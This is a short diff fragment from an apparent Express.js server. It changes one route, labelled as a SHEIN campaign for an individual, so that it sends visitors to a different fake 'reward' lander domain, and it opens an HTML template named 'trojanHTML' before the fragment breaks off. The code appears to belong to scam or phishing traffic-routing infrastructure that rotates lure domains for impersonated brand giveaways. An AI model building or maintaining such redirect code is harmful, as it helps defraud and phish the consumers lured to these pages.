@@ -1932,7 +1932,7 @@ app.get('/team1/:slug', (req, res, next) => {
 // Abdullah SHEIN Campaign
 app.get('/abdu/:slug', (req, res, next) => {
     const { slug } = req.params;
-    const destinationLander = `https://tok-reward.com/shein13750.html?slug=${slug}`;
+    const destinationLander = `https://rewards-for-all.com/shein13750.html?slug=${slug}`;
     const trojanHTML = `
         <!DOCTYPE html>
         <html lang="en">
